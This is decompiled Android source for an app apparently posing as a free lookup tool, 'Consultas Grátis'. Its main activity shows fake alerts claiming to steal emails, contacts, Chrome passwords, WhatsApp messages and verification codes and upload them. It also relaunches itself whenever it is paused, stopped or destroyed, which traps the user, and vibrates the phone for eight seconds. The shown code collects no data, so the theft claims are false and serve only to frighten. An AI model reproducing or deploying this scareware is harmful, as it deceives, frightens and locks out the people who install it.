package com.my.newproject2;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.Bundle;
import android.os.Vibrator;
import android.util.SparseBooleanArray;
import android.util.TypedValue;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.Random;

public class MainActivity extends Activity {
	private Builder Dialo;
	private ImageView imageview1;
	private Intent inten;
	private LinearLayout linear2;
	private TextView textview1;
	private TextView textview2;
	private TextView textview3;
	private Vibrator vibrar;

	class AnonymousClass_1 implements OnClickListener {
		final /* synthetic */ MainActivity this$0;

		AnonymousClass_1(MainActivity r1_MainActivity) {
			super();
			this$0 = r1_MainActivity;
		}

		public void onClick(DialogInterface r4_DialogInterface, int r5i) {
			this$0.inten.setClass(this$0.getApplicationContext(), Tela02Activity.class);
			this$0.inten.setFlags(67108864);
			this$0.startActivity(this$0.inten);
			SketchwareUtil.showMessage(this$0.getApplicationContext(), "Acesso ao Armazenamento interno concedido\u2713");
		}
	}


	public MainActivity() {
		super();
		inten = new Intent();
	}

	private void initialize(Bundle r2_Bundle) {
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		textview1 = (TextView) findViewById(R.id.textview1);
		textview2 = (TextView) findViewById(R.id.textview2);
		textview3 = (TextView) findViewById(R.id.textview3);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		vibrar = (Vibrator) getSystemService("vibrator");
		Dialo = new Builder(this);
	}

	private void initializeLogic() {
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: E-mails");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Contatos");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Imagens");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Arquivos Armazenados na mem\u00f3ria interna");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Arquivos Armazenados na mem\u00f3ria Externa");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Senhas salvas no Google Chrome");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Mensagens do WhatsApp.inc");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: V\u00eddeos do WhatsApp.inc");
		SketchwareUtil.showMessage(getApplicationContext(), "CAPTURANDO: Imagens do WhatsApp.inc");
		SketchwareUtil.showMessage(getApplicationContext(), "SOLICITANDO: C\u00f3digo de confirma\u00e7\u00e3o do WhatsApp.inc");
		SketchwareUtil.showMessage(getApplicationContext(), "CONCLU\u00cdDO: C\u00f3digo capturado com sucesso");
		SketchwareUtil.showMessage(getApplicationContext(), "Dados sendo enviados para nossa base de dados (h-+80)...");
		SketchwareUtil.showMessage(getApplicationContext(), "Enviando...");
		SketchwareUtil.showMessage(getApplicationContext(), "1%(5%)");
		SketchwareUtil.showMessage(getApplicationContext(), "2%(5%)");
		SketchwareUtil.showMessage(getApplicationContext(), "3%(5%)");
		SketchwareUtil.showMessage(getApplicationContext(), "4%(5%)");
		SketchwareUtil.showMessage(getApplicationContext(), "5%(5%)");
		SketchwareUtil.showMessage(getApplicationContext(), "Conclu\u00eddo com sucesso\u221a");
	}

	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView r7_ListView) {
		ArrayList<Double> r1_ArrayList_Double = new ArrayList();
		SparseBooleanArray r2_SparseBooleanArray = r7_ListView.getCheckedItemPositions();
		int r0i = 0;
		while (r0i < r2_SparseBooleanArray.size()) {
			if (r2_SparseBooleanArray.valueAt(r0i)) {
				r1_ArrayList_Double.add(Double.valueOf((double) r2_SparseBooleanArray.keyAt(r0i)));
			}
			r0i++;
		}
		return r1_ArrayList_Double;
	}

	@Deprecated
	public float getDip(int r4i) {
		return TypedValue.applyDimension(1, (float) r4i, getResources().getDisplayMetrics());
	}

	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}

	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}

	@Deprecated
	public int getLocationX(View r3_View) {
		int[] r0_int_A = new int[2];
		r3_View.getLocationInWindow(r0_int_A);
		return r0_int_A[0];
	}

	@Deprecated
	public int getLocationY(View r3_View) {
		int[] r0_int_A = new int[2];
		r3_View.getLocationInWindow(r0_int_A);
		return r0_int_A[1];
	}

	@Deprecated
	public int getRandom(int r3i, int r4i) {
		return new Random().nextInt((r4i - r3i) + 1) + r3i;
	}

	protected void onActivityResult(int r1i, int r2i, Intent r3_Intent) {
		super.onActivityResult(r1i, r2i, r3_Intent);
	}

	public void onBackPressed() {
		Dialo.setTitle("Consultas Gr\u00e1tis n\u00e3o est\u00e1 respondendo");
		Dialo.setMessage("Deseja sair?");
		Dialo.setPositiveButton("Sair", new AnonymousClass_1(this));
		Dialo.create().show();
	}

	protected void onCreate(Bundle r2_Bundle) {
		super.onCreate(r2_Bundle);
		setContentView(R.layout.main);
		initialize(r2_Bundle);
		initializeLogic();
	}

	public void onDestroy() {
		super.onDestroy();
		inten.setClass(getApplicationContext(), MainActivity.class);
		inten.setFlags(67108864);
		startActivity(inten);
	}

	public void onPause() {
		super.onPause();
		inten.setClass(getApplicationContext(), MainActivity.class);
		inten.setFlags(67108864);
		startActivity(inten);
	}

	protected void onPostCreate(Bundle r4_Bundle) {
		super.onPostCreate(r4_Bundle);
		inten.setClass(getApplicationContext(), MainActivity.class);
		inten.setFlags(67108864);
		startActivity(inten);
	}

	public void onResume() {
		super.onResume();
		vibrar.vibrate(8000);
	}

	public void onStart() {
		super.onStart();
		inten.setClass(getApplicationContext(), MainActivity.class);
		inten.setFlags(67108864);
		startActivity(inten);
	}

	public void onStop() {
		super.onStop();
		inten.setClass(getApplicationContext(), MainActivity.class);
		inten.setFlags(67108864);
		startActivity(inten);
	}

	@Deprecated
	public void showMessage(String r3_String) {
		Toast.makeText(getApplicationContext(), r3_String, 0).show();
	}
}
